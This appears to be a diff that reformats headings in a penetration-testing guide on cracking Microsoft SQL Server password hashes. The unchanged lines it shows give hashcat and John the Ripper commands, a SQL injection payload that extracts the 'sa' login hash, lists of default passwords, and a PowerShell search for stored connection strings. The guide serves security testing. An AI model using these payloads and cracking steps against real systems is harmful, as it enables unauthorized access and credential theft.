@@ -7,11 +7,9 @@ tags: ["password cracking", "hash", "authentication"]
 lastUpdated: 2025-03-15
 ---
 
-## Password Cracking
-
 After extracting password hashes from Microsoft SQL Server, the next step in a penetration test is often to attempt cracking these hashes to recover plaintext passwords. This knowledge can be valuable for lateral movement, privilege escalation, or accessing other systems where credentials might be reused.
 
-### SQL Server Hash Types
+## SQL Server Hash Types
 
 Before attempting to crack SQL Server password hashes, it's important to identify the hash type based on its format:
 
@@ -21,7 +19,7 @@ Before attempting to crack SQL Server password hashes, it's important to identif
 | SQL Server 2005+   | 0x0200\[SHA-1 hash\]\[salt\]   | 0x020058CD420B993C1C32561C772608D549FCEDFA66C8B733C3270DD8D3D32385D6580A6D367B |
 | SQL Server 2012+   | 0x0200\[SHA-512 hash\]\[salt\] | (longer hash with same prefix)                                                 |
 
-### Cracking Tools
+## Cracking Tools
 
 Several tools can be used to crack SQL Server password hashes:
 
@@ -33,7 +31,7 @@ Several tools can be used to crack SQL Server password hashes:
 | SQLPing/SQLPAT  | Specialized SQL Server tools      | SQL Server-specific capabilities                          |
 | Hydra/Medusa    | Online password crackers          | For direct SQL Server authentication attempts             |
 
-### Hashcat Commands for SQL Server Hashes
+## Hashcat Commands for SQL Server Hashes
 
 ```bash
 # SQL Server 2000 (hash mode 131)
@@ -46,7 +44,7 @@ hashcat -m 132 -a 0 mssql_hashes.txt wordlist.txt
 hashcat -m 1731 -a 0 mssql_hashes.txt wordlist.txt
 ```
 
-### John the Ripper Commands
+## John the Ripper Commands
 
 ```bash
 # SQL Server 2000
@@ -59,9 +57,9 @@ john --format=mssql05 mssql_hashes.txt
 john --format=mssql12 mssql_hashes.txt
 ```
 
-### Attack Strategies
+## Attack Strategies
 
-#### Dictionary Attack
+### Dictionary Attack
 
 Using a wordlist of common passwords:
 
@@ -69,7 +67,7 @@ Using a wordlist of common passwords:
 hashcat -m 132 -a 0 mssql_hashes.txt rockyou.txt
 ```
 
-#### Rule-based Attack
+### Rule-based Attack
 
 Applying transformations to dictionary words:
 
@@ -77,7 +75,7 @@ Applying transformations to dictionary words:
 hashcat -m 132 -a 0 mssql_hashes.txt rockyou.txt -r rules/best64.rule
 ```
 
-#### Brute Force Attack
+### Brute Force Attack
 
 Trying all possible combinations of characters:
 
@@ -86,7 +84,7 @@ Trying all possible combinations of characters:
 hashcat -m 132 -a 3 mssql_hashes.txt ?a?a?a?a?a?a?a?a
 ```
 
-#### Mask Attack
+### Mask Attack
 
 Targeted brute force using patterns:
 
@@ -95,7 +93,7 @@ Targeted brute force using patterns:
 hashcat -m 132 -a 3 mssql_hashes.txt ?u?l?l?l?l?l?d?d
 ```
 
-#### Hybrid Attack
+### Hybrid Attack
 
 Combining dictionary words with patterns:
 
@@ -104,7 +102,7 @@ Combining dictionary words with patterns:
 hashcat -m 132 -a 6 mssql_hashes.txt rockyou.txt ?d?d?d?d
 ```
 
-### Hash Extraction Techniques
+## Hash Extraction Techniques
 
 Before cracking, you need to extract hashes. With SQL injection access:
 
@@ -116,11 +114,11 @@ Before cracking, you need to extract hashes. With SQL injection access:
 ' UNION SELECT name, CAST(password_hash AS varchar(max)) FROM sys.sql_logins WHERE name = 'sa'--
 ```
 
-### Format Conversion for Cracking Tools
+## Format Conversion for Cracking Tools
 
 SQL Server hashes often need to be reformatted for cracking tools:
 
-#### SQL Server 2000 Format
+### SQL Server 2000 Format
 
 ```markdown
 # Original format
@@ -132,7 +130,7 @@ SQL Server hashes often need to be reformatted for cracking tools:
 0100B58E58130D2B6FF57F70737D3978
 ```
 
-#### SQL Server 2005+ Format
+### SQL Server 2005+ Format
 
 ```markdown
 # Original format
@@ -144,7 +142,7 @@ SQL Server hashes often need to be reformatted for cracking tools:
 020058CD420B993C1C32561C772608D549FCEDFA:66C8B733C3270DD8D3D32385D6580A6D367B
 ```
 
-### Common Default and Weak Passwords
+## Common Default and Weak Passwords
 
 Many SQL Server installations use default or weak passwords:
 
@@ -155,7 +153,7 @@ Many SQL Server installations use default or weak passwords:
 | sqladmin       | sqladmin, password, Password123                                     |
 | [company name] | [company name], [company name]123, Welcome123                       |
 
-### Password Policy Considerations
+## Password Policy Considerations
 
 SQL Server's password policies affect cracking success:
 
@@ -168,9 +166,9 @@ SQL Server's password policies affect cracking success:
 
 3. SQL Server 2019+ may use additional security features making cracking more difficult
 
-### Optimizing Cracking Performance
+## Optimizing Cracking Performance
 
-#### Hashcat Optimizations
+### Hashcat Optimizations
 
 ```bash
 # Use multiple GPUs
@@ -183,7 +181,7 @@ hashcat -m 132 -a 0 -w 3 mssql_hashes.txt wordlist.txt
 hashcat -m 132 -a 3 mssql_hashes.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1
 ```
 
-#### John the Ripper Optimizations
+### John the Ripper Optimizations
 
 ```bash
 # Use multiple cores
@@ -193,7 +191,7 @@ john --format=mssql05 --fork=4 mssql_hashes.txt
 john --format=mssql05 --session=sqlserver mssql_hashes.txt
 ```
 
-### Real-World Attack Workflow
+## Real-World Attack Workflow
 
 1. **Extract hashes**:
 
@@ -221,7 +219,7 @@ john --format=mssql05 --session=sqlserver mssql_hashes.txt
    hashcat -m 132 formatted_hashes.txt --show
    ```
 
-### Special SQL Server Password Considerations
+## Special SQL Server Password Considerations
 
 1. **Case Sensitivity**: SQL Server login passwords are case-sensitive by default
 
@@ -233,7 +231,7 @@ john --format=mssql05 --session=sqlserver mssql_hashes.txt
 
 5. **Service Account Reuse**: Often, SQL Server service accounts have their passwords reused across multiple services
 
-### Alternative Attack Vectors
+## Alternative Attack Vectors
 
 When hash cracking is difficult, consider:
 
@@ -257,7 +255,7 @@ When hash cracking is difficult, consider:
    Get-ChildItem -Path C:\ -Recurse -Include *.config -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString" -SimpleMatch
    ```
 
-### Security Recommendations
+## Security Recommendations
 
 To protect against password cracking:
 
